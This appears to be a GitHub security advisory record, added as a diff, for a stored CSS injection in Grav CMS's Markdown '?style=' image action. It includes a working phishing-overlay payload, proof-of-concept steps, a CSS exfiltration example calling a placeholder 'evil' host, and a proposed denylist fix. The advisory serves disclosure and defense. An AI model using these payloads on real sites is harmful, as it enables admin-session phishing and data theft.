@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-pmf8-g7c8-7v54",
+  "modified": "2026-06-18T14:49:19Z",
+  "published": "2026-06-18T14:49:19Z",
+  "aliases": [
+    "CVE-2026-55890"
+  ],
+  "summary": "Grav: Stored CSS injection via Markdown image ?style=… reaches MediaObjectTrait::style() — incomplete patch of GHSA-r7fx-8g49-7hhr",
+  "details": "## Summary\n\nThe fix for **GHSA-r7fx-8g49-7hhr / CVE-2026-42841** (Stored XSS via Markdown media `attribute()` action) is incomplete. The maintainer patched `MediaObjectTrait::attribute()` to deny dangerous attribute names (event handlers, `style`, `xmlns`, `srcdoc`, `formaction`) but the sibling `MediaObjectTrait::style()` method is reachable through the **same Markdown excerpt-action pipeline** and writes editor-controlled strings straight into the rendered `<img style=\"…\">` attribute with **no sanitization**.\n\nAny user with `admin.pages` permission (e.g. an editor) can save Markdown like:\n\n```markdown\n![logo](image.png?style=position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999)\n```\n\nwhich renders to a stored-CSS payload that any higher-privileged viewer (administrator, super-admin, reviewer) loads in their authenticated session. Same trust boundary, same victim, same attacker, same Markdown input vector as the patched GHSA-r7fx-8g49-7hhr issue — the fix simply patched the `attribute()` entry point and missed the `style()` sibling.\n\n## Affected versions\n\nVulnerable at HEAD across every currently-shipping branch (verified 2026-06-15):\n\n| Branch / tag | `MediaObjectTrait::style()` |\n|---|---|\n| `develop` (`f4c0f42`) | unpatched |\n| `2.0` (`96e1d2d`) | unpatched |\n| `2.0.0-rc.8` (latest 2.0 RC tag) | unpatched |\n| `1.7.52` (latest 1.7 stable) | unpatched |\n\nPer `SECURITY.md`, this advisory targets the **2.0 line** (publisher-level exploit, not eligible for 1.7 backport per the project's stated policy).\n\n## Trust boundary\n\nPer the project's `SECURITY.md`:\n\n> A vulnerability is when an actor can **escape the trust scope of their role**: a publisher whose stored content compromises an admin session, an unauthenticated visitor who reaches a privileged sink, an account at any tier that gains capabilities it was not granted.\n\nAn editor authoring Markdown is operating within their role. A higher-privilege admin loading that editor's page in their authenticated session and getting attacker-controlled CSS painted into their browser is **across the trust boundary** — the same framing that was accepted for GHSA-r7fx-8g49-7hhr (MODERATE) and GHSA-c2q3-p4jr-c55f (MODERATE).\n\n## Details\n\n### Original GHSA-r7fx-8g49-7hhr fix (commit `5a12f9be8`, 2026-04-23)\n\n```php\npublic function attribute($attribute = null, $value = '')\n{\n    if (empty($attribute) || !is_string($attribute)) {\n        return $this;\n    }\n    if (!self::isSafeAttributeName($attribute)) {\n        return $this;\n    }\n    $this->attributes[$attribute] = $value;\n    return $this;\n}\n\nprivate static function isSafeAttributeName(string $name): bool\n{\n    if (!preg_match('/^[A-Za-z][A-Za-z0-9_:.\\-]*$/', $name)) {\n        return false;\n    }\n    $lower = strtolower($name);\n    if (str_starts_with($lower, 'on')) {        // event handlers\n        return false;\n    }\n    $denylist = ['style', 'xmlns', 'srcdoc', 'formaction'];\n    return !in_array($lower, $denylist, true);\n}\n```\n\n`style` is the **second-named entry** on the denylist — the maintainer explicitly recognised that editor-supplied `style` was dangerous when arriving via the `attribute()` action. The fix simply didn't reach the parallel sink.\n\n### The unpatched sibling: `MediaObjectTrait::style()` (line 519)\n\n```php\n/**\n * Allows to add an inline style attribute from Markdown or Twig\n * Example: ![Example](myimg.png?style=float:left)\n */\npublic function style($style)\n{\n    $this->styleAttributes[] = rtrim($style, ';') . ';';\n    return $this;\n}\n```\n\nThe function is unchanged before, during, and after the GHSA-r7fx-8g49-7hhr fix. The PHPDoc on the very next line names the Markdown invocation form (`?style=…`). The `rtrim` is for clean concatenation, not security.\n\n`$styleAttributes` is concatenated and assigned to `attributes['style']` in `parsedownElement()` (lines 242–251):\n\n```php\n$style = '';\nforeach ($this->styleAttributes as $key => $value) {\n    if (is_numeric($key)) {        // editor-supplied entries are numeric-keyed\n        $style .= $value;\n    } else {\n        $style .= $key . ': ' . $value . ';';\n    }\n}\nif ($style) {\n    $attributes['style'] = $style;\n}\n```\n\nParsedown then runs `htmlspecialchars` on the value (so quote-breakout into a new attribute is blocked), but arbitrary CSS as the value is enough.\n\n### Source → sink trace\n\nThe Markdown processor wires query-string keys to method calls on the `Medium` object (`system/src/Grav/Common/Page/Markdown/Excerpts.php:262`):\n\n```php\nforeach ($actions as $action) {\n    $matches = [];\n    if (preg_match('/\\[(.*)\\]/', (string) $action['params'], $matches)) {\n        $args = [explode(',', $matches[1])];\n    } else {\n        $args = explode(',', (string) $action['params']);\n    }\n    $medium = call_user_func_array([$medium, $action['method']], $args);\n}\n```\n\n`?style=position:fixed;top:0;left:0` becomes `$medium->style('position:fixed;top:0;left:0')`.\n\n### Save-side XSS detector misses the payload\n\n`AdminController::savePage()` runs `Security::detectXssFromArray()` on `data[content]` before persisting (`classes/plugin/AdminController.php:1402`). All five default patterns miss the Markdown form:\n\n- `on_events`: requires `<…on*=` in source.\n- `invalid_protocols`: requires `javascript:`/`data:`/etc. — the phishing-overlay payload uses none.\n- `moz_binding`: requires `-moz-binding:` literally.\n- `html_inline_styles`: requires `<…style=…(url:|x:expression)`; Markdown source has no `<` and no `url:`.\n- `dangerous_tags`: requires `<svg`/`<script`/etc.\n\nSave proceeds, the payload persists, the CSS is rendered to every viewer.\n\n## Impact\n\n- **Phishing overlay** — full-viewport `position:fixed` covering the admin UI with attacker-controlled background/content; admin clicks intended actions into the attacker's overlay.\n- **UI redress / clickjacking** — invisible overlays hijacking admin button clicks.\n- **CSS-selector data exfiltration** — `input[value^=\"a\"] { background: url(//evil/log?c=a) }` against form fields the higher-privileged viewer interacts with.\n- **Persistent admin-UI denial-of-service** — `position:fixed; background:white` covers the page until the offending content is removed by hand on the server.\n\nThe stored payload reaches every user who views the editor's page — including administrators previewing pending changes.\n\n## Proof of concept\n\nA deterministic end-to-end PoC against a real Grav install ships with the finding (`repro.sh`). Steps:\n\n1. Log in as an editor (`admin.pages` + `admin.pages.update`, no `admin.super`).\n2. Upload a benign image to a target page.\n3. Save the page with the Markdown payload `![alt](image?style=position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999)`.\n4. Visit the public page; observe the `<img style=\"…\">` carrying the unsanitised CSS.\n\n## Suggested fix\n\nApply the same denylist + identifier-shape gate to `style()` that `isSafeAttributeName()` enforces for `attribute()`:\n\n```diff\n public function style($style)\n {\n+    if (!is_string($style) || !self::isSafeStyleValue($style)) {\n+        return $this;\n+    }\n     $this->styleAttributes[] = rtrim($style, ';') . ';';\n     return $this;\n }\n\n+/**\n+ * Editor-controlled style values arrive via Markdown `?style=…` and reach\n+ * the rendered `<img style=\"…\">` attribute verbatim. Limit to a conservative\n+ * set of CSS that themes legitimately use from content (sizing, float,\n+ * margin, etc.) and reject anything that opens a phishing-overlay or\n+ * data-exfil primitive. Matches the spirit of the attribute() denylist\n+ * from GHSA-r7fx-8g49-7hhr — same trust boundary, sibling sink.\n+ */\n+private static function isSafeStyleValue(string $css): bool\n+{\n+    $css = strtolower($css);\n+    // Deny: phishing-overlay positioning, CSS-selector exfil sinks\n+    // (background/content url(...)), expression() (legacy IE),\n+    // -moz-binding (legacy FF), behavior: url() (IE).\n+    $deny = ['position:', '@import', 'url(', 'expression(',\n+             '-moz-binding', 'behavior:', 'z-index:', 'fixed', 'absolute'];\n+    foreach ($deny as $needle) {\n+        if (str_contains($css, $needle)) {\n+            return false;\n+        }\n+    }\n+    return (bool) preg_match('/^[A-Za-z0-9 :;%.,\\-#\\/]*$/', $css);\n+}\n```\n\nAlternatively, deprecate the Markdown `?style=…` action entirely — themes can still set inline styles from PHP, but accepting attacker-controlled CSS from page content was always a footgun.\n\nDefense in depth: extend `Security::detectXss()`'s `html_inline_styles` rule to also match Markdown-form `?style=` query parameters in `data[content]` on save.\n\n## References\n\n- Original advisory: GHSA-r7fx-8g49-7hhr\n- Fix commit: `5a12f9be8` (`system/src/Grav/Common/Media/Traits/MediaObjectTrait.php`)\n- Unpatched code: `system/src/Grav/Common/Media/Traits/MediaObjectTrait.php` lines 519–524\n- Project security policy: `SECURITY.md` (trust-boundary severity model)",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "getgrav/grav"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.0-rc.9"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 2.0.0-rc.8"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-pmf8-g7c8-7v54"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/5a12f9be8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-06-18T14:49:19Z",
+    "nvd_published_at": null
+  }
+}
